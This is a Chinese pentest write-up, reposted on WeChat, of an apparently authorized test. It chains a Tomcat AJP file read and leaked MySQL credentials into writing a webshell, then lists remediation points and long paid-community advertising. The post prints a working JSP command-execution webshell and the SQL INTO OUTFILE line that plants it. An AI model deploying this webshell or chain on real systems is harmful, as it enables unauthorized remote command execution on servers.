> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247491705&idx=1&sn=aeeb5d16f0b1511b8d2413c49b170e7a

#  【SRC】未授权访问漏洞的利用链：一口气到getshell的实践  
hkhigh  神农Sec   2025-06-15 01:03  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：  
hkhigh  
  
文章来源：https://www.freebuf.com/articles/web/432220.html  
  
  
**未授权到后台getshell实战**  
  
  
## 一、前置背景  
  
上篇文章《未授权访问漏洞的利用链》渗透的步骤到了找上传点getshell，但是找不到上传返回的路径，无法访问shell。这里又有了新的口子，一口气记录直接一把拿下，这里只是记录思路，实际场景已经从外部转到内部继续渗透，作为企业安全者的角度对系统进行更全面的评估。  
  
**说明：该目标为公司系统，经过授权测试。**  
## 二、操作步骤  
### 2.1 其他突破——AJP任意文件读取  
### 2.1.1 Nmap扫描端口：  
  
![1747979977_68300ec9b1118b1c4b644.png!small?1747979978007](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3A1uu4BdmZwc0xL9E6lcMPhuhpMibdyDAUIunrGpIGysndjrZ6WsXr2qw/640?wx_fmt=jpeg&from=appmsg "")  
  
可以看到操作系统版本Windows Server2008，比较老，或许后面能利用上永恒之蓝MS17010，永恒Blue等漏洞。  
  
关注到**8009**  
端口 开放了AJP 尝试AJP任意文件读取漏洞  
  
利用POC ajp任意文件读取POC验证了该漏洞确实存在  
  
![1747980686_6830118ee40ca08835ee0.png!small?1747980687018](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3A5g9qicJ75uW9HahCiaZFjjiczx1XMD6ptYdmICqkib7rGX76LI5ggIJnCQ/640?wx_fmt=jpeg&from=appmsg "")  
  
进一步读取敏感配置目录，发现MySQL数据库账户密码 mysql:password  
  
![1747980818_683012124fe53890c9179.png!small?1747980818383](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3AekXCgAENLjnQcHVaDbStTkPkic1ISU198dEaQvQYABoICSTnFgHEBrw/640?wx_fmt=jpeg&from=appmsg "")  
### 2.1.2 数据库写webshell  
  
成功登录数据库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3A71FY4vHmU31tzLBkshncUeCtb5xa83f3jcgLVrTa5zhaedk9sntHIw/640?wx_fmt=png&from=appmsg "")  
  
查看是否具备该mysql账户是否具备FILE权限：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3AcrFKbVWhTM05ZejksWfIfMicBQFln5EU4drlGEOxqy8PldMBicz7T8fA/640?wx_fmt=png&from=appmsg "")  
  
查看是否允许任意位置写文件，secure_file_priv字段要为空或指定目录才可以  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3AOBZianOQicbbjOaGgFOCft1dVrp6Sg1ica9eVMeKY1ibexnlibNPezwqFLA/640?wx_fmt=png&from=appmsg "")  
  
成功写入文件到主机：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3AQuLBVdjheUq1fabv2E5LmIMVzNdWqWkx43MKx3VibtNbITSic3xUxJcQ/640?wx_fmt=png&from=appmsg "")  
### 2.2 承接上篇——目录爆破得不够彻底  
  
用dirsearch爆破目录的时候一定要写上-r参数，这表示递归的去爆破目录，找到一层之后继续往下找，穷举完才结束。  
  
所以在这里就很幸运的找到了另外一个上传文件的接口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3ArAVzbSvuDG5gKnwlvibXx2Abclnac7ib3UITicI4zeC0kJfcAC38iarIXw/640?wx_fmt=png&from=appmsg "")  
  
访问得到这样一个页面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3AR4PP4pEUumhXiaURn8Vx4EE56PC5t7cAnVChjqulOYw0iaib7mC8s9ePw/640?wx_fmt=png&from=appmsg "")  
  
虽然选择文件上传仍然没有返回路径，但是点击最下面那个提交按钮，竟然返回了网站部署的绝对路径！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3Ao4UGxUL8ibzB9oxiasiaWsxMZnAs4j3wWdqOaR1DJMibcGUbiaLZRf0jdHw/640?wx_fmt=png&from=appmsg "")  
  
那就尝试在d:\Apache Software Foundation\Tomcat 6.0\webapps\ROOT\这个目录下写webshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3At7bK2D1lKv0wibZopTglg4nwUgcmYJv9jLnjRkBFEcNpbH1TgjqBoqA/640?wx_fmt=png&from=appmsg "")  
  
成功写入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3A6wrYgIDIScTH1MwDO16I9dBNsdoOGMLoibJyUMEY4ZOOicb9c2ibscTRQ/640?wx_fmt=png&from=appmsg "")  
## 三、成功getshell  
  
在数据库中执行  
  
写入一句话木马  
> SELECT '<%if("pass".equals(request.getParameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>'  
INTO OUTFILE 'D:/Apache Software Foundation/Tomcat 6.0/webapps/ROOT/1.jsp';  
  
  
  
访问/shell.jsp?pwd=pass&cmd=whoami  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVOqUaaMC5iceWvdeCGtZZ3AkLLeJUbrmD4P8qUSVibjibkXUxuicT3Sg2RwNpibosic3LUQX38thzNwAvw/640?wx_fmt=png&from=appmsg "")  
  
可以看到权限很高，甚至都不需要进一步的提权。  
## 四、总结和修复方法  
  
这个系统很薄弱，从外部来看：  
  
1）很多报错暴露了敏感路径；  
  
2）系统没有口令强度机制和防爆机制；  
  
3）开发写的代码有逻辑错误导致可以越权；  
  
从内部来看：  
  
3）系统权限没有配置好，权限过高（这里包含数据库和网站）；  
  
4）还存在2020年的老漏洞未修复；  
  
5）没有部署任何防护工具（EDR、HIDS），这种简单的木马甚至不用做免杀。  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于900人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUULMWYYicxI1oIZZu1chARoMttntYglBBjtL5tbEeyjQxaibiablKM26xoGibI1Rc1QgOrQbDvia1suXA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满900人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUULMWYYicxI1oIZZu1chARofUVubmvPhriajwklmicmPZKTLKSPibIeBqwBWodRribuC1lzZYvOmCkL4w/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
